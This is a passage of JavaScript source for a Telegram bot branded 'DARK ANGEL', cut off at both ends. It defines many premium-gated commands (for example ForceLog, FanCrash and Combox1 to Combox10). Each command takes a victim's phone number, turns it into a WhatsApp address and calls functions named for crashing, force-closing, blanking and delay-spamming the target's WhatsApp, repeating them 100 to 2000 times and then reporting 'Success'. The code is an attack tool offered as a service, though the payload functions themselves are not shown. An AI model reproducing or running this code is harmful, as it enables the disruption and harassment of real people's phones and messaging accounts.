<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Delay Extreme
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await JawaTimurForclosexDelayNew(sock, target);
   await DelayCanSpamByMia(sock, target);
   await astec(target);
   await VnXDelayXBulldoNew(sock, target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Delay Extreme
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Zverper", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Zverper 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Delay Super
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 200; i++) {
   await JawaTimurForclosexDelayNew(sock, target);
   await DelayCanSpamByMia(sock, target);
   await astec(target);
   await VnXDelayXBulldoNew(sock, target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Delay Super
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("ForceLog", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /ForceLog 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡
☐ Target: ${q}
☐ Type: Forclose
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await JawaTimurBlankOld(sock, target);
   await JawaTimurForcloseRelog(sock, target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Forclose
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("ForceClk", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /ForceClk 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡
☐ Target: ${q}
☐ Type: Forclose
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await JawaTimurBlankOld(sock, target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Forclose
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("ForceLay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /ForceLay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡
☐ Target: ${q}
☐ Type: Forclose
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 300; i++) {
   await JawaTimurForclosexDelayNew(sock, target);
   await DelayStatusHardByMia(sock, target);
   await DelayCanSpamByMia(sock, target);
   await await astec(target);
   await JawaTimurBlankOld(sock, target);
   await ForceInvisions(target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Forclose
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("ForceStudnt", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /ForceStudnt 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡
☐ Target: ${q}
☐ Type: Forclose
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 2000; i++) {
   await ForceInvisions(target);
   await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Forclose
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Lordsy", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Lordsy 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Blank Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await blankclickv1(sock, target);
   await astec(target);
   await JawaTimurForcloseRelog(sock, target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Blank Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("DarkKiller", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /DarkKiller 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Blank Hard
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 200; i++) {
   await blankclickv1(sock, target);
   await JawaTimurForcloseRelog(sock, target);
   await astec(target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Blank Hard
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("FanCrash", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /FanCrash 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 200; i++) {
   await blankclickv1(sock, target);
   await astec(target);
   await JawaTimurForcloseRelog(sock, target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("CrosAngel", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /CrosAngel 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 300; i++) {
   await blankclickv1(sock, target);
   await JawaTimurForcloseRelog(sock, target);
   await astec(target);
   await sleep(5000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("BuldLank", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /BuldLank 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Buldo x Blank
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await blankclickv1(sock, target);
   await astec(target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Buldo x Blank
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Combox1", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Combox1 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 300; i++) {
   await JawaTimurForclosexDelayNew(sock, target);
   await DelayStatusHardByMia(sock, target);
   await DelayCanSpamByMia(sock, target);
   await blankclickv1(sock, target);
   await JawaTimurForcloseRelog(sock, target);
   await astec(target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Combox2", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Combox2 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 300; i++) {
   await JawaTimurForclosexDelayNew(sock, target);
   await DelayStatusHardByMia(sock, target);
   await DelayCanSpamByMia(sock, target);
   await JawaTimurBlankOld(sock, target);
   await ForceInvisions(target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Combox3", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Combox3 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 300; i++) {
   await JawaTimurForclosexDelayNew(sock, target);
   await DelayStatusHardByMia(sock, target);
   await DelayCanSpamByMia(sock, target);
   await blankclickv1(sock, target);
   await await astec(target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Combox5", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Combox5 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 300; i++) {
   await JawaTimurForclosexDelayNew(sock, target);
   await DelayStatusHardByMia(sock, target);
   await await DelayCanSpamByMia(sock, target);
   await await astec(target);
   await JawaTimurBlankOld(sock, target);
   await ForceInvisions(target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("FaiqxRaraCombo5", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /FaiqxRaraCombo5 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await FaiqNoClicknew(target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Combox4", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Combox4 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 300; i++) {
   await JawaTimurForclosexDelayNew(sock, target);
   await DelayStatusHardByMia(sock, target);
   await DelayCanSpamByMia(sock, target);
   await blankclickv1(sock, target);
   await astec(target);
   await JawaTimurBlankOld(sock, target);
   await ForceInvisions(target);
   await JawaTimurForcloseRelog(sock, target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Combox6", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Combox6 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await JawaTimurForcloseRelog(sock, target);
   await blankclickv1(sock, target);
   await astec(target);
   await JawaTimurBlankOld(sock, target);
   await ForceInvisions(target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Combox7", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Combox7 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await blankclickv1(sock, target);;
   await astec(target);
   await JawaTimurBlankOld(sock, target);
   await ForceInvisions(target);
   await JawaTimurForcloseRelog(sock, target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Combox8", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Combox8 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await blankclickv1(sock, target);
   await JawaTimurForcloseRelog(sock, target);
   await astec(target);
   await await VnXDelayXBulldoNew(sock, target);
   await JawaTimurBlankOld(sock, target);
   await ForceInvisions(target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Combox9", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Combox9 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 100; i++) {
   await blankclickv1(sock, target);
   await astec(target);
   await JawaTimurBlankOld(sock, target);
   await ForceInvisions(target);
   await JawaTimurForcloseRelog(sock, target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("Combox10", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /Combox10 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = false;

  const processMessage = await ctx.telegram.sendVideo(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Process</blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "Check ⵢ Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

    for (let i = 0; i < 300; i++) {
   await JawaTimurForclosexDelayNew(sock, target);
   await DelayStatusHardByMia(sock, target);
   await DelayCanSpamByMia(sock, target);
   await blankclickv1(sock, target);
   await astec(target);
   await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>⬡═―—⊱ ⎧ D A R K ⵢ A N G E L ⎭ ⊰―—═⬡

☐ Target: ${q}
☐ Type: Crash Andro
☐ Status: Success</blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
